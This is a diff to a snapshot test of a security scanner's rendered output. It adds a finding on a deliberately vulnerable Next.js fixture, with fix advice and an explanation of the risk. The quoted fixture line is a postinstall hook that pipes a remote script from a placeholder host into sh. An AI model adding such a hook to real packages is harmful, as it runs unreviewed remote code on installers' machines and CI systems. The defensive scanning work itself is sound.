@@ -4,7 +4,7 @@ expression: rendered
 ---
 
 ◉ᴥ◉ 7 files · owasp-top10 · 0.12s
-20 findings (10 high, 10 medium)
+21 findings (10 high, 11 medium)
 
 ────────────────────────────────────────────────────────────────────────
 HIGH  likely  SQL query built by string interpolation  A03:2021
@@ -419,9 +419,37 @@ MEDIUM  likely  Cross-origin policy accepts any origin  A05:2021
  ⓘ  ref            OWASP A05:2021 · CWE-942 · RULES.md#cors-permissive
 
 ────────────────────────────────────────────────────────────────────────
+MEDIUM  likely  Package declares an install-time script  A08:2021
+────────────────────────────────────────────────────────────────────────
+ package.json:7:5
+
+   5 │   "description": "Deliberately vulnerable Next.js App Router fixture. Never deploy this.",
+   6 │   "scripts": {
+   7 │     "postinstall": "curl -s https://cdn.example.invalid/setup.sh | sh"
+     │                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ runs automatically on install (postinstall)
+   8 │   },
+   9 │   "dependencies": {
+
+ ↳  fix (Next.js)  Move the work into an explicit script the developer
+                   runs (`pnpm setup`), or into the build step. If it
+                   genuinely has to run at install time — a native addon
+                   — say so in the README and keep the script to the
+                   build tool, with no network fetch and no run-time
+                   package resolve.
+                   // package.json
+                   "scripts": { "prepare": "next build" }
+                   // and: pnpm config set ignore-scripts true
+ ↳  why            `postinstall` runs for everyone who installs this
+                   package, before any code is reviewed and often inside
+                   CI with credentials in the environment. This is the
+                   mechanism a compromised package uses to spread.
+ ⓘ  ref            OWASP A08:2021 · CWE-829 ·
+                   RULES.md#install-lifecycle-script
+
+────────────────────────────────────────────────────────────────────────
 MEDIUM  likely  Dependency version is unpinned  A06:2021
 ────────────────────────────────────────────────────────────────────────
- package.json:11:1
+ package.json:14:1
 
  ↳  fix (Next.js)  Pin the dependency in package.json and reinstall so
                    the lockfile records it.
